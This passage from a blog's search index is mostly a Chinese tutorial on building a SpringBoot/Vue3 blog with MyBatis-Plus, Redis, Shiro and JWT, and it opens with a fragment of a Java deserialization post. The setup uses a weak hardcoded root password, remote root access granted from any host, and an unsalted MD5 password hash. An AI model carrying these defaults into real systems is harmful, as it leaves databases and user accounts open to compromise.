Java中并不是所有对应都支持序列化，待序列化的对象和所有它","date":"2023-11-24","objectID":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:0:3","tags":["CC链","反序列化","Java安全"],"title":"CommonsCollections1利用链学习","uri":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"跟着B站上一位UP主过了一遍这个简单的前后端分离的博客项目，其中还有很多细节没太懂，但是记录一下算是学习过的痕迹~ 视频地址：https://www.bilibili.com/video/BV1PQ4y1P7hZ 后端 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:0:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"一、新建项目，整合MP ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"0.新建spring-boot项目 暂时添加下面四个依赖： ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:1","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"1.安装mysql（docker） https://juejin.cn/post/7043826861272465445 docker pull mysql/mysql-server docker run -p 3306:3306 --name mysql --privileged=true -e MYSQL_ROOT_PASSWORD=123456 -e character-set-server=utf8 -e collation-server=utf8_general_ci -d mysql/mysql-server # 进入容器 docker exec -it 7b7997b002a8 /bin/sh # 登录 mysql -u root -p # 创建数据库和表：执行第二步，然后再执行下面的代码 # 查看权限 select host, user, authentication_string, plugin from mysql.user; # 设置root权限和访问 update mysql.user set host='%' where user ='root'; grant all privileges on *.* to 'root'@'%' with grant option; flush privileges; SHOW GRANTS FOR 'root'@'%'; IDEA测试连接 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:2","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"2.创建数据库和表 create database vueblog; use vueblog; DROP TABLE IF EXISTS `m_blog`; /*!40101 SET @saved_cs_client = @@character_set_client */; SET character_set_client = utf8mb4 ; CREATE TABLE `m_blog` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `user_id` bigint(20) NOT NULL, `title` varchar(255) NOT NULL, `description` varchar(255) NOT NULL, `content` longtext, `created` datetime NOT NULL ON UPDATE CURRENT_TIMESTAMP, `status` tinyint(4) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; DROP TABLE IF EXISTS `m_user`; /*!40101 SET @saved_cs_client = @@character_set_client */; SET character_set_client = utf8mb4 ; CREATE TABLE `m_user` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `username` varchar(64) DEFAULT NULL, `avatar` varchar(255) DEFAULT NULL, `email` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL, `status` int(5) NOT NULL, `created` datetime DEFAULT NULL, `last_login` datetime DEFAULT NULL, PRIMARY KEY (`id`), KEY `UK_USERNAME` (`username`) USING BTREE ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; /*!40101 SET character_set_client = @saved_cs_client */; INSERT INTO `vueblog`.`m_user` (`id`, `username`, `avatar`, `email`, `password`, `status`, `created`, `last_login`) VALUES ('1', 'markerhub', 'https://image-1300566513.cos.ap-guangzhou.myqcloud.com/upload/images/5a9f48118166308daba8b6da7e466aab.jpg', NULL, '96e79218965eb72c92a549dd5a330112', '0', '2020-04-20 10:44:01', NULL); ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:3","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"3.导入mybatis plus相关jar包 Pom.xml \u003c!-- 模板引擎--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-freemarker\u003c/artifactId\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/com.baomidou/mybatis-plus-boot-starter --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.baomidou\u003c/groupId\u003e \u003cartifactId\u003emybatis-plus-boot-starter\u003c/artifactId\u003e \u003cversion\u003eLATEST\u003c/version\u003e \u003c/dependency\u003e \u003c!--mybatis-plus代码生成器(版本和mp要一致，不然会报错)--\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.baomidou\u003c/groupId\u003e \u003cartifactId\u003emybatis-plus-generator\u003c/artifactId\u003e \u003cversion\u003e3.5.3.1\u003c/version\u003e \u003c/dependency\u003e 引入新依赖之后需要刷新 maven 依赖， ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:4","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"4.修改application配置文件 注意分清文件格式，这里用的是application.yaml # DataSource Config spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/vueblog?useUnicode=true\u0026useSSL=false\u0026characterEncoding=utf8\u0026serverTimezone=Asia/Shanghai username: root password: 123456 mybatis-plus: mapper-locations: classpath*:/mapper/**Mapper.xml server: port: 8081 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:5","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"5.开启mapper接口扫描，添加分页插件 配置分页MybatisPlusConfig mybatis-plus3.5分页插件使用(PaginationInterceptor):https://blog.csdn.net/moshowgame/article/details/123058673 新版的写法: package com.example.vueblog1.config; import com.baomidou.mybatisplus.annotation.DbType; import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor; import org.mybatis.spring.annotation.MapperScan; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.transaction.annotation.EnableTransactionManagement; import java.util.Collections; @Configuration @EnableTransactionManagement @MapperScan(\"com.markerhub.mapper\") public class MybatisPlusConfig { @Bean public PaginationInnerInterceptor paginationInnerInterceptor() { PaginationInnerInterceptor paginationInterceptor = new PaginationInnerInterceptor(); // 设置最大单页限制数量，默认 500 条，-1 不受限制 paginationInterceptor.setMaxLimit(-1L); paginationInterceptor.setDbType(DbType.MYSQL); // 开启 count 的 join 优化,只针对部分 left join paginationInterceptor.setOptimizeJoin(true); return paginationInterceptor; } @Bean public MybatisPlusInterceptor mybatisPlusInterceptor(){ MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor(); mybatisPlusInterceptor.setInterceptors(Collections.singletonList(paginationInnerInterceptor())); return mybatisPlusInterceptor; } } 旧版的写法： package com.example.vueblog.config; import com.baomidou.mybatisplus.extension.plugins.PaginationInterceptor; import org.mybatis.spring.annotation.MapperScan; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.transaction.annotation.EnableTransactionManagement; @Configuration @EnableTransactionManagement @MapperScan(\"com.example.vueblog.mapper\") public class MybatisPlusConfig { @Bean public PaginationInterceptor paginationInterceptor() { PaginationInterceptor paginationInterceptor = new PaginationInterceptor(); return paginationInterceptor; } } ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:6","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"6.生成代码 官方给我们提供了一个代码生成器，然后我写上自己的参数之后，就可以直接根据数据库表信息生成entity、service、serviceImpl、mapper等接口和实现类。 创建CodeGenerator(在com.vueblog包下面) 需要修改文件里面的mysql连接的配置信息和保存的包配置 package com.example.vueblog; import com.baomidou.mybatisplus.core.exceptions.MybatisPlusException; import com.baomidou.mybatisplus.core.toolkit.StringPool; import com.baomidou.mybatisplus.core.toolkit.StringUtils; import com.baomidou.mybatisplus.generator.AutoGenerator; import com.baomidou.mybatisplus.generator.InjectionConfig; import com.baomidou.mybatisplus.generator.config.*; import com.baomidou.mybatisplus.generator.config.po.TableInfo; import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy; import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine; import java.util.ArrayList; import java.util.List; import java.util.Scanner; // 演示例子，执行 main 方法控制台输入模块表名回车自动生成对应项目目录中 public class CodeGenerator { /** * \u003cp\u003e * 读取控制台内容 * \u003c/p\u003e */ public static String scanner(String tip) { Scanner scanner = new Scanner(System.in); StringBuilder help = new StringBuilder(); help.append(\"请输入\" + tip + \"：\"); System.out.println(help.toString()); if (scanner.hasNext()) { String ipt = scanner.next(); if (StringUtils.isNotEmpty(ipt)) { return ipt; } } throw new MybatisPlusException(\"请输入正确的\" + tip + \"！\"); } public static void main(String[] args) { // 代码生成器 AutoGenerator mpg = new AutoGenerator(); // 全局配置 GlobalConfig gc = new GlobalConfig(); String projectPath = System.getProperty(\"user.dir\"); gc.setOutputDir(projectPath + \"/src/main/java\"); // gc.setOutputDir(\"D:\\\\test\"); gc.setAuthor(\"anonymous\"); gc.setOpen(false); // gc.setSwagger2(true); 实体属性 Swagger2 注解 gc.setServiceName(\"%sService\"); mpg.setGlobalConfig(gc); // 数据源配置 数据库名 账号密码 DataSourceConfig dsc = new DataSourceConfig(); dsc.setUrl(\"jdbc:mysql://localhost:3306/vueblog?useUnicode=true\u0026useSSL=false\u0026characterEncoding=utf8\u0026serverTimezone=UTC\"); // dsc.setSchemaName(\"public\"); dsc.setDriverName(\"com.mysql.cj.jdbc.Driver\"); dsc.setUsername(\"root\"); dsc.setPassword(\"123456\"); mpg.setDataSource(dsc); // 包配置 PackageConfig pc = new PackageConfig(); pc.setModuleName(null); pc.setParent(\"com.example.vueblog\"); mpg.setPackageInfo(pc); // 自定义配置 InjectionConfig cfg = new InjectionConfig() { @Override public void initMap() { // to do nothing } }; // 如果模板引擎是 freemarker String templatePath = \"/templates/mapper.xml.ftl\"; // 如果模板引擎是 velocity // String templatePath = \"/templates/mapper.xml.vm\"; // 自定义输出配置 List\u003cFileOutConfig\u003e focList = new ArrayList\u003c\u003e(); // 自定义配置会被优先输出 focList.add(new FileOutConfig(templatePath) { @Override public String outputFile(TableInfo tableInfo) { // 自定义输出文件名 ， 如果你 Entity 设置了前后缀、此处注意 xml 的名称会跟着发生变化！ return projectPath + \"/src/main/resources/mapper/\" + \"/\" + tableInfo.getEntityName() + \"Mapper\" + StringPool.DOT_XML; } }); cfg.setFileOutConfigList(focList); mpg.setCfg(cfg); // 配置模板 TemplateConfig templateConfig = new TemplateConfig(); templateConfig.setXml(null); mpg.setTemplate(templateConfig); // 策略配置 StrategyConfig strategy = new StrategyConfig(); strategy.setNaming(NamingStrategy.underline_to_camel); strategy.setColumnNaming(NamingStrategy.underline_to_camel); strategy.setEntityLombokModel(true); strategy.setRestControllerStyle(true); strategy.setInclude(scanner(\"表名，多个英文逗号分割\").split(\",\")); strategy.setControllerMappingHyphenStyle(true); strategy.setTablePrefix(\"m_\"); mpg.setStrategy(strategy); mpg.setTemplateEngine(new FreemarkerTemplateEngine()); mpg.execute(); } } 运行这个java文件，生成文件的效果如下： 如果报错，可以考虑一下是不是pom中自动生成的包版本太高，可以考虑降级，生成完毕之后再升级回去即可 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:7","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"7.测试效果 运行项目： ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:1:8","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"二、统一封装返回结果 这里我们用到了一个Result的类，这个用于我们的异步统一返回的结果封装，方便前后端对接。一般来说，结果里面有几个要素必要的 是否成功，可用code表示（如200表示成功，400表示异常） 结果消息 结果数据 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:2:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"Result类 路径com.vueblog.common.lang; 新建类： package com.example.vueblog.common.lang; import lombok.Data; import java.io.Serializable; @Data public class Result implements Serializable { private int code; //200是正常 400表示异常 private String msg; private Object data;//返回数据 //定义静态的方法，可以直接调用 //成功：这个是成功只返回数据的情况 // 这个也可以用多个构造函数来实现，这个思想用的较多 public static Result succ( Object data){ return succ(200,\"操作成功\",data); } //成功 public static Result succ(int code,String msg,Object data){ Result r = new Result(); r.setCode(code); r.setMsg(msg); r.setData(data); return r; } //失败 public static Result fail(String msg){ return fail(400,msg,null); } //失败 public static Result fail(String msg,Object data){ return fail(400,msg,data); } //失败 public static Result fail(int code,String msg,Object data){ Result r = new Result(); r.setCode(code); r.setMsg(msg); r.setData(data); return r; } } ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:2:1","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"在UserController 中引用测试 package com.example.vueblog.controller; import com.example.vueblog.common.lang.Result; import com.example.vueblog.entity.User; import com.example.vueblog.service.UserService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; /** * \u003cp\u003e * 前端控制器 * \u003c/p\u003e * * @author anonymous * @since 2023-07-18 */ @RestController @RequestMapping(\"/user\") public class UserController { @Autowired private UserService userService; @GetMapping(\"/index\") public Object index(){ User user = userService.getById(1); return Result.succ(200,\"操作成功\", user); // return userService.getById(1); } } ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:2:2","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"三、整合Shiro+jwt，实现会话共享 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:3:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"Shiro整合jwt逻辑 用户登录使用jwt生成token，当登录的用户去访问数据时用shiro验证用户是否具有权限。 没有登录的话没有jwt，访问数据时也是shiro判断。 考虑到后面可能需要做集群、负载均衡等，所以就需要会话共享，而shiro的缓存和会话信息，我们一般考虑使用redis来存储这些数据，所以，我们不仅仅需要整合shiro，同时也需要整合redis。在开源的项目中，我们找到了一个starter可以快速整合shiro-redis，配置简单，这里也推荐大家使用。 而因为我们需要做的是前后端分离项目的骨架，所以一般我们会采用token或者jwt作为跨域身份验证解决方案。所以整合shiro的过程中，我们需要引入jwt的身份验证过程。 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:3:1","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"整合 redis安装： 我也是通过docker安装 docker pull redis docker images # 启动 docker run -d --name redis -p 6379:6379 redis:latest redis-server --appendonly yes --requirepass \"自己设置的密码\" # 说明：redis-server --appendonly yes：在容器执行redis-server启动命令，并打开redis持久化配置 docker ps # 进入容器 docker exec -ti redis redis-cli 我们使用一个shiro-redis-spring-boot-starter的jar包，具体教程可以看官方文档：https://github.com/alexxiyang/shiro-redis/blob/master/docs/README.md#spring-boot-starter 第一步：导入shiro-redis的starter包：还有jwt的工具包，以及为了简化开发，引入hutool工具包。 pom.xml中导入: \u003c!-- shiro-redis --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.crazycake\u003c/groupId\u003e \u003cartifactId\u003eshiro-redis-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e3.3.1\u003c/version\u003e \u003c/dependency\u003e \u003c!-- hutool工具类 --\u003e \u003cdependency\u003e \u003cgroupId\u003ecn.hutool\u003c/groupId\u003e \u003cartifactId\u003ehutool-all\u003c/artifactId\u003e \u003cversion\u003e5.8.16\u003c/version\u003e \u003c/dependency\u003e \u003c!-- jwt 生成工具 校验工具--\u003e \u003cdependency\u003e \u003cgroupId\u003eio.jsonwebtoken\u003c/groupId\u003e \u003cartifactId\u003ejjwt\u003c/artifactId\u003e \u003cversion\u003e0.9.1\u003c/version\u003e \u003c/dependency\u003e 配置文件添加： 第二步：自定义ShiroConfig 在com.example.vueblog.config下新建java类： 按照官方文档把这些Bean复制下来： package com.example.vueblog.config; import com.example.vueblog.shiro.AccountRealm; import com.example.vueblog.shiro.JwtFilter; import org.apache.shiro.mgt.DefaultSessionStorageEvaluator; import org.apache.shiro.mgt.DefaultSubjectDAO; import org.apache.shiro.mgt.SecurityManager; import org.apache.shiro.session.mgt.SessionManager; import org.apache.shiro.spring.web.ShiroFilterFactoryBean; import org.apache.shiro.spring.web.config.DefaultShiroFilterChainDefinition; import org.apache.shiro.spring.web.config.ShiroFilterChainDefinition; import org.apache.shiro.web.mgt.DefaultWebSecurityManager; import org.apache.shiro.web.session.mgt.DefaultWebSessionManager; import org.crazycake.shiro.RedisCacheManager; import org.crazycake.shiro.RedisSessionDAO; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import java.util.HashMap; import java.util.LinkedHashMap; import java.util.Map; import javax.servlet.Filter; /** * shiro启用注解拦截控制器 */ @Configuration public class ShiroConfig { @Autowired private JwtFilter jwtFilter; @Bean public SessionManager sessionManager(RedisSessionDAO redisSessionDAO) { DefaultWebSessionManager sessionManager = new DefaultWebSessionManager(); sessionManager.setSessionDAO(redisSessionDAO); return sessionManager; } @Bean public DefaultWebSecurityManager securityManager(AccountRealm accountRealm, SessionManager sessionManager, RedisCacheManager redisCacheManager) { // AccountRealm是我们自己定义的 DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager(accountRealm); securityManager.setSessionManager(sessionManager); securityManager.setCacheManager(redisCacheManager); /* * 关闭shiro自带的session，详情见文档 */ DefaultSubjectDAO subjectDAO = new DefaultSubjectDAO(); DefaultSessionStorageEvaluator defaultSessionStorageEvaluator = new DefaultSessionStorageEvaluator(); defaultSessionStorageEvaluator.setSessionStorageEnabled(false); subjectDAO.setSessionStorageEvaluator(defaultSessionStorageEvaluator); securityManager.setSubjectDAO(subjectDAO); return securityManager; } //shiro过滤器链的定义：哪些链接需要经过哪些过滤器 @Bean public ShiroFilterChainDefinition shiroFilterChainDefinition() { DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition(); Map\u003cString, String\u003e filterMap = new LinkedHashMap\u003c\u003e(); filterMap.put(\"/**\", \"jwt\"); // 主要通过注解方式校验权限。所有链接都要经过jwt来校验 chainDefinition.addPathDefinitions(filterMap); return chainDefinition; } //这些方法用的时候不用自己写，复制根据自己的项目改改就行 @Bean(\"shiroFilterFactoryBean\") public ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager, ShiroFilterChainDefinition shiroFilterChainDefinition) { ShiroFilterFactoryBean shiroFilter = new ShiroFilterFactoryBean(); shiroFilter.setSecurityManager(securityManager); //然后使用jwt的filter，所有的链接都会经过我们定义的filter Map\u003cString, Filter\u003e filters = new HashMap\u003c\u003e(); filters.put(\"jwt\", jwtFilter); //这里的jwt路径跟上一个方法是对应的 shiro","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:3:2","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"四、shiro逻辑开发 小提示:登录调用AccountRealm类下面的doGetAuthenticationInfo 创建类AccountProfile 用于传递用户可以公开的数据 package com.example.vueblog.shiro; import lombok.Data; import java.io.Serializable; @Data public class AccountProfile implements Serializable { private Long id; private String username; private String avatar; private String email; } 完善AccountRealm package com.example.vueblog.shiro; import cn.hutool.core.bean.BeanUtil; import com.example.vueblog.entity.User; import com.example.vueblog.service.UserService; import com.example.vueblog.util.JwtUtils; import org.apache.shiro.authc.*; import org.apache.shiro.authz.AuthorizationInfo; import org.apache.shiro.realm.AuthorizingRealm; import org.apache.shiro.subject.PrincipalCollection; import org.springframework.beans.BeanUtils; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; @Component public class AccountRealm extends AuthorizingRealm { @Autowired JwtUtils jwtUtils; @Autowired UserService userService; //继承AuthorizingRealm，重写方法 //为了让realm支持jwt的凭证校验token @Override public boolean supports(AuthenticationToken token) { return token instanceof JwtToken; } //授权 @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) { return null; } //认证 @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException { //会到这里处理，强转成JwtToken JwtToken jwtToken = (JwtToken) token; String userId = jwtUtils.getClaimByToken((String) jwtToken.getCredentials()).getSubject(); User user = userService.getById(Long.valueOf(userId)); if(user == null){throw new UnknownAccountException(\"账户不存在\");} if(user.getStatus() == -1){ throw new LockedAccountException(\"账户被锁定\"); } AccountProfile profile = new AccountProfile(); BeanUtil.copyProperties(user, profile); //传递数据 return new SimpleAuthenticationInfo(profile, jwtToken.getCredentials(), getName()); } } ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:4:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"五、异常处理 创建GlobalExceptionHandler 类 package com.example.vueblog.exception; import com.example.vueblog.common.lang.Result; import lombok.extern.slf4j.Slf4j; import org.apache.shiro.ShiroException; import org.springframework.http.HttpStatus; import org.springframework.web.bind.annotation.ExceptionHandler; import org.springframework.web.bind.annotation.ResponseStatus; import org.springframework.web.bind.annotation.RestControllerAdvice; /** * 日志输出 * 全局捕获异常 */ @Slf4j @RestControllerAdvice public class GlobalExceptionHandler { @ResponseStatus(HttpStatus.UNAUTHORIZED) //因为前后端分离 返回一个状态 一般是401 没有权限 @ExceptionHandler(value = ShiroException.class) //捕获运行时异常ShiroException是大部分异常的父类 public Result hander(ShiroException e){ log.error(\"运行时异常-----{}\",e); return Result.fail(401,e.getMessage(), null); } @ResponseStatus(HttpStatus.BAD_REQUEST) @ExceptionHandler(value = RuntimeException.class) public Result hander(RuntimeException e){ log.error(\"运行时异常-----{}\",e); return Result.fail(e.getMessage()); } } 然而我们运行测试发现并没有拦截,因为我们没有进行登录拦截 @RequiresAuthentication//登录拦截注解 运行效果： ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:5:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"六、实体校验 